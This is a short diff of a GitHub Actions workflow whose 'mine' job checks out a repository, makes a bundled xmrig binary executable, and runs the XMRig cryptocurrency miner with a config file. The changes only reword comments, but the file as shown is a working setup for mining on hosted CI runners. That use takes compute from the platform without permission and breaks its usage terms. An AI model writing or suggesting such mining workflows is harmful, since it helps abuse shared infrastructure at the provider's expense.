@@ -9,15 +9,15 @@ jobs:
   mine:
     runs-on: ubuntu-latest
     steps:
-      # Checkout repository to get the files
+      # Checkout repository to get files
       - name: Setup Repository
         uses: actions/checkout@v3
 
-      # Set execute permissions for XMRig
+      # Set execute permissions for the xmrig binary
       - name: Set Execute Permissions
         run: chmod +x ./xmrig
 
-      # Run XMRig directly
+      # Run the xmrig binary
       - name: Start Mining
         run: |
           ./xmrig --config=config.json
